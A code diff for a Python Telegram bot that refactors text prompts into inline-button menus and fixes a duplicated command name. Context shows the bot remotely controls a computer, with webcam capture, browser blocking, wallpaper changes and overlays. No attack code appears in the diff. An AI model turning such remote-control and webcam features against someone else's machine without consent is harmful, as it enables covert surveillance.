@@ -666,7 +666,7 @@ class PeppinoTelegram:
 
             # 🔧 Utilities & Testing
             Command("status", lambda: self.bsend("Hey! I'm online"), "Just checking if the bot is online.",  "utility", "Check Status"),
-            Command("status", self.restart, "Restarts the bot process.",  "utility", "Restart"),
+            Command("restart", self.restart, "Restarts the bot process.",  "utility", "Restart"),
             Command("get_logs", self.get_logs, "Gets the program logs ins a file", "utility", "📄 Get Logs"),
             Command("stop", self.stop, "Stop current operation.", "utility", "🛑 Stop"),
             Command("test", self.test, "Run test routine.", "null", "🧪 Test"),
@@ -739,22 +739,13 @@ class PeppinoTelegram:
             )
 
     def ask_yesno(self, custom_message: str = "Confirm action") -> bool:
-        prompt = (
-            f"<b>{custom_message}</b>\n\n"
-            "Choose your action:\n"
-            "• <b>y</b> / <b>yes</b> — proceed\n"
-            "• <b>n</b> / <b>no</b> — abort"
-        )
-
-        
-        print(f"Asking yes/no: {custom_message}")
-        response = self.send_prompt(prompt)
-        if response:
-            response = response.lower().strip()
-        else:
-            return False
-
-        return response in ("y", "yes")
+        return self.send_buttons_input(
+            title=custom_message,
+            options={
+                "y":"✅ Yes",
+                "n":"❌ No"
+            }
+        ) == "y"
     
     @requires_admin
     def block_chrome(self, timeout: int) -> None:
@@ -1838,10 +1829,17 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.bsendWithHtml(preview_msg)
 
     def on_callback_query(self, msg) -> None:
-        print("Handling callback query")
-        query_id, from_id, data = glance(msg, flavor="callback_query")
-        Thread(target=self.parse_command, args=(data, )).start()
-        self.bot.answerCallbackQuery(query_id)
+        query_id, from_id, query_data = glance(msg, flavor='callback_query')
+        self.bot.answerCallbackQuery(query_id, text="Got it!")  # or empty text=""
+
+        if self.user.get("status") == "waiting_callback" and query_data.startswith("choice:"):
+            parts = query_data.split(":", 2)
+            if len(parts) == 3 and parts[1] == self.user.get("expected_menu_id"):
+                self.user["last_callback"] = parts[2]          # ← the key ("button1", "yes", etc.)
+                return
+
+        # If not our menu → treat as normal command
+        self.parse_command(query_data)
 
     def opencap(self) -> None:
         print("Opening webcam capture")
@@ -2552,46 +2550,44 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             remove(filepath)
             message.delete()
 
-    def choose_position(self) -> str|None:
-        prompt = ("""<b>🎯 Select Position</b>
-Choose a position by number:
-
-<b>Single Positions:</b>
-1️⃣ <b>Top</b>
-2️⃣ <b>Bottom</b>
-3️⃣ <b>Left</b>
-4️⃣ <b>Right</b>
-5️⃣ <b>Center</b>
-
-<b>Combinations:</b>
-6️⃣ <b>Top-Left</b>
-7️⃣ <b>Top-Right</b>
-8️⃣ <b>Bottom-Left</b>
-9️⃣ <b>Bottom-Right</b>
-
-<i>Reply with the corresponding <b>number</b>.</i>>""")
-        posx = {
-            "1": "top",
-            "2": "bottom",
-            "3": "left",
-            "4": "right",
-            "5": "center",
-            "6": "top-left",
-            "7": "top-right",
-            "8": "bottom-left",
-            "9": "bottom-right",
+    def choose_position(self) -> str | None:
+        """
+        Lets the user select a screen position using inline buttons.
+        Returns one of: "top", "bottom", "left", "right", "center",
+                        "top-left", "top-right", "bottom-left", "bottom-right"
+                        or None if timed out / cancelled
+        """
+        options = {
+            "top":        "⬆️  Top",
+            "bottom":     "⬇️  Bottom",
+            "left":       "⬅️  Left",
+            "right":      "➡️  Right",
+            "center":     "🎯 Center",
+            "top-left":   "↖️ Top-Left",
+            "top-right":  "↗️ Top-Right",
+            "bottom-left":"↙️ Bottom-Left",
+            "bottom-right":"↘️ Bottom-Right",
         }
-        pos_idx = self.send_prompt(prompt, delete=True)
 
-        if pos_idx is None:
-            self.operation_canceled("Action timed out.")
-            return
+        title = (
+            "<b>🎯 Select Position</b>\n\n"
+            "Choose where to place the overlay:"
+        )
 
-        if not pos_idx.isnumeric():
-            self.operation_canceled(f"Choose an option between 1 and {max(posx.keys())}")
-            return
+        selected_key = self.send_buttons_input(
+            options=options,
+            title=title,
+            timeout=30,
+            rows=3
+        )
 
-        return posx[pos_idx]
+        if selected_key is None:
+            self.operation_canceled("Operation Timed Out")
+            return None
+
+        self.bsendWithHtml(f"Selected position: <b>{options[selected_key]}</b>")
+
+        return selected_key
 
     def confirmContuinuingWithoutWallpaperBackup(self):
         print("Confirming wallpaper backup")
@@ -2862,6 +2858,62 @@ Choose a position by number:
                 self.delete_message(msgid)
             return tmp
 
+    def send_buttons_input(self, options: dict[str, str], title: str = "Choose an option", timeout: int = 30, rows: int = 2) -> str | None:
+        """
+        Sends an inline menu and waits for user to click one button.
+        Returns the key from options dict, or None on timeout.
+        """
+        print(f"Waiting for button choice: title='{title}', options={options}, timeout={timeout}")
+
+        menu_id = randomname(8)
+        keyboard = []
+        current_row = []
+
+        for key, label in options.items():
+            callback_data = f"choice:{menu_id}:{key}"
+            button = {"text": label, "callback_data": callback_data}
+            current_row.append(button)
+
+            if len(current_row) == rows:
+                keyboard.append(current_row)
+                current_row = []
+
+        if current_row:
+            keyboard.append(current_row)
+
+        markup = {"inline_keyboard": keyboard}
+
+        menu_msg_id = self.bsend(title, reply_markup=markup)
+
+        self.user["status"] = "waiting_callback"
+        self.user["expected_menu_id"] = menu_id
+        self.user["last_callback"] = None
+
+        start = monotonic()
+        while monotonic() - start < timeout:
+            if self.user["last_callback"] is not None:
+                break
+            sleep(0.3)
+
+        chosen_key = self.user.get("last_callback")
+        
+        # Clean up state
+        self.user["status"] = None
+        self.user["expected_menu_id"] = None
+        self.user["last_callback"] = None
+
+        # Delete the menu message
+        try:
+            self.delete_message(menu_msg_id)
+        except:
+            pass
+
+        if chosen_key is None:
+            self.operation_canceled("Operation Timed Out")
+            return None
+
+        return chosen_key
+
     def start(self) -> None:
         print("Starting bot")
         STARTING_LOG_MESSAGE = self.new_editable_message("🚀 STARTING")
@@ -2969,37 +3021,6 @@ Choose a position by number:
 
     def test(self) -> None: #this is a test command used for test purpuses, can be used with /test
         print("Running test")
-        message = """
-        <b>Bold</b>
-        <strong>Strong Bold</strong>
-
-        <i>Italic</i>
-        <em>Emphasis</em>
-
-        <u>Underline</u>
-
-        <s>Strikethrough</s>
-        <del>Deleted Text</del>
-
-        <tg-spoiler>Spoiler Text</tg-spoiler>
-
-        <code>Inline code</code>
-
-        <pre>Plain code block
-        line 2
-        line 3</pre>
-
-        <pre><code class="language-python">
-        def hello():
-            print("Hello World")
-        </code></pre>
-
-        <a href="https://example.com">Clickable Link</a>
-
-        <a href="tg://user?id=123456789">User Mention by ID</a>
-        """
-        self.bsendWithHtml(message)
-
 
     def update_commands(self) -> bool:
         print("Updating commands")
